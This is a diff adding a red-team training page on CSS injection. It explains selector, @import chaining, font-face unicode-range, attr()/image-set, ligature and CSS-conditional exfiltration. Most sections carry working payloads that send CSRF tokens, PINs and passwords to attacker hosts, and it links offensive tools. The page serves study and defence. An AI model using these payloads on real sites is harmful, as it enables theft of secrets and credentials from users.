@@ -1,0 +1,111 @@
+---
+layout: training-page
+title: "CSS Injection — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - css-injection
+  - data-exfiltration
+  - csrf-bypass
+  - blind-css
+page_key: "web-css-injection"
+---
+<h1>CSS Injection</h1>
+<p>CSS Injection occurs when an application allows untrusted CSS to be injected into a web page. Because CSS is often permitted by Content Security Policy rules that block JavaScript, this technique is used to exfiltrate sensitive data — such as CSRF tokens, hidden input values, or attribute contents — by triggering network requests based on element attributes and selector matches.</p>
+
+<h2>Tools</h2>
+<ul>
+  <li><strong>blind-css-exfiltration</strong> — Exfiltrate unknown web pages using Blind CSS — <code>github.com/hackvertor/blind-css-exfiltration</code></li>
+  <li><strong>css-exfiltration</strong> — PortSwigger collection of CSS exfiltration techniques — <code>github.com/PortSwigger/css-exfiltration</code></li>
+  <li><strong>css-scrollbar-attack</strong> — PoC for leaking text nodes via CSS injection using scrollbars — <code>github.com/cgvwzq/css-scrollbar-attack</code></li>
+  <li><strong>sic</strong> — Sequential Import Chaining for advanced CSS exfiltration — <code>github.com/d0nutptr/sic</code></li>
+  <li><strong>fontleak</strong> — Fast exfiltration of text using CSS and Ligatures — <code>github.com/adrgs/fontleak</code></li>
+</ul>
+
+<h2>CSS Selector Exfiltration</h2>
+<p>CSS attribute selectors match elements based on their attribute values. When a selector matches, the browser loads any referenced background image — including an attacker-controlled URL — leaking the matched value. This technique brute-forces a secret character by character.</p>
+<p>Selector types:</p>
+<ul>
+  <li><code>input[value^=a]</code> — prefix match (value starts with "a")</li>
+  <li><code>input[value$=a]</code> — suffix match (value ends with "a")</li>
+  <li><code>input[value*=a]</code> — substring match (value contains "a")</li>
+</ul>
+<p>Basic exfiltration via background image:</p>
+<pre><code>input[value^="TOKEN_012"] {
+  background-image: url(http://attacker.example.com/?prefix=TOKEN_012);
+}
+
+input[name="pin"][value="1234"] {
+  background: url(https://attacker.com/log?pin=1234);
+}</code></pre>
+
+<h3>Hidden Input Fields</h3>
+<p>You cannot apply a background image to a hidden input directly. Use a sibling selector to style a visible element after the hidden input:</p>
+<pre><code>input[name="csrf-token"][value^="a"] + input {
+  background: url(https://attacker.com?q=a)
+}</code></pre>
+
+<h3>:has() Pseudo-class</h3>
+<p>The <code>:has()</code> pseudo-class styles a parent element based on its children, allowing exfiltration from parent context:</p>
+<pre><code>div:has(input[value="1337"]) {
+  background:url(/collectData?value=1337);
+}</code></pre>
+
+<h2>CSS Import Exfiltration (Blind CSS)</h2>
+<p>The <code>@import</code> rule imports external stylesheets. An attacker-controlled server can respond with crafted CSS that triggers selector-based callbacks. Because <code>@import</code> supports long-polling, frames do not need to reload — the browser processes the import and applies new styles dynamically.</p>
+<pre><code>&lt;style&gt;@import url(http://attacker.com/staging?len=32);&lt;/style&gt;
+&lt;style&gt;@import'//YOUR-PAYLOAD.oastify.com'&lt;/style&gt;</code></pre>
+
+<h3>Sequential Import Chaining (SIC)</h3>
+<p>SIC chains multiple extraction steps without reloading the page:</p>
+<ol>
+  <li>Inject an initial <code>@import</code> rule pointing to a staging payload on the attacker server.</li>
+  <li>The staging server holds the connection open (long-polling) while generating the next payload.</li>
+  <li>When a CSS rule matches (a character is found via <code>background-image</code>), the browser makes a request.</li>
+  <li>The server detects this and generates the next <code>@import</code> rule to continue the chain.</li>
+</ol>
+
+<h2>CSS Font-face Unicode Range Attack</h2>
+<p>The <code>@font-face</code> at-rule with <code>unicode-range</code> causes the browser to fetch a specific font only if a matching character is present on the page. By assigning unique URLs to each character, an attacker can detect which characters exist in a target element.</p>
+<pre><code>&lt;style&gt;
+@font-face{ font-family:poc; src: url(http://attacker.example.com/?A); unicode-range:U+0041; }
+@font-face{ font-family:poc; src: url(http://attacker.example.com/?B); unicode-range:U+0042; }
+@font-face{ font-family:poc; src: url(http://attacker.example.com/?C); unicode-range:U+0043; }
+#sensitive-information{ font-family:poc; }
+&lt;/style&gt;
+&lt;p id="sensitive-information"&gt;AB&lt;/p&gt;</code></pre>
+<p><strong>Limitations:</strong> Cannot distinguish repeated characters (e.g., "AA" triggers one request). Does not reveal order of characters. Despite this, it is a reliable oracle for character existence. Chrome marked this "WontFix" (issue 40083029).</p>
+
+<h2>Attribute Extraction via attr()</h2>
+<p>The CSS <code>attr()</code> function retrieves an element's attribute value. With recent updates to <code>attr()</code> (Advanced attr in Chrome), it can be combined with <code>image-set()</code> to extract input values cross-origin. When the stylesheet is hosted on the attacker's server, relative URLs resolve against the attacker's origin — leaking the attribute value as a path request.</p>
+<p>Target HTML:</p>
+<pre><code>&lt;input type="text" name="password" value="supersecret"&gt;</code></pre>
+<p>Attacker's <code>index.css</code>:</p>
+<pre><code>input[name="password"] {
+  background: image-set(attr(value))
+}</code></pre>
+<p>Resulting request on attacker's server:</p>
+<pre><code>GET /supersecret HTTP/1.1</code></pre>
+
+<h2>Ligature-based Exfiltration</h2>
+<p>A ligature combines multiple characters into a single wide glyph. By crafting a custom font where specific character sequences produce ligatures with extreme widths, an attacker can detect the presence of target strings through layout changes detected via media queries or scrollbar width differences.</p>
+<pre><code>docker run -it --rm -p 4242:4242 -e BASE_URL=http://localhost:4242 ghcr.io/adrgs/fontleak:latest</code></pre>
+<p>Payload using <code>fontleak</code> with a custom selector and alphabet. The CSS selector must match exactly one element on the target page:</p>
+{% raw %}
+<pre><code>&lt;style&gt;@import url("http://localhost:4242/?selector=.secret&amp;parent=head&amp;alphabet=abcdef0123456789");&lt;/style&gt;</code></pre>
+{% endraw %}
+
+<h2>CSS Conditionals (Inline Style Exfiltration)</h2>
+<p>This advanced technique uses CSS <code>if()</code> conditionals and custom properties to perform logic within a style attribute — without any JavaScript. The example below steals a <code>data-uid</code> attribute if it matches a value between 1 and 10:</p>
+{% raw %}
+<pre><code>&lt;div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3)))); background: image-set(var(--steal));' data-uid='1'&gt;&lt;/div&gt;</code></pre>
+{% endraw %}
+
+<h2>Resources</h2>
+<ul>
+  <li>blind-css-exfiltration — <code>github.com/hackvertor/blind-css-exfiltration</code></li>
+  <li>fontleak — <code>github.com/adrgs/fontleak</code></li>
+  <li>Sequential Import Chaining (sic) — <code>github.com/d0nutptr/sic</code></li>
+  <li>CSS Injection (xsleaks.dev) — <code>xsleaks.dev/docs/attacks/css-injection/</code></li>
+  <li>Blind CSS Exfiltration — Gareth Heyes, PortSwigger Research</li>
+  <li>CSS based Attack: Abusing unicode-range of @font-face — Masato Kinugawa</li>
+</ul>
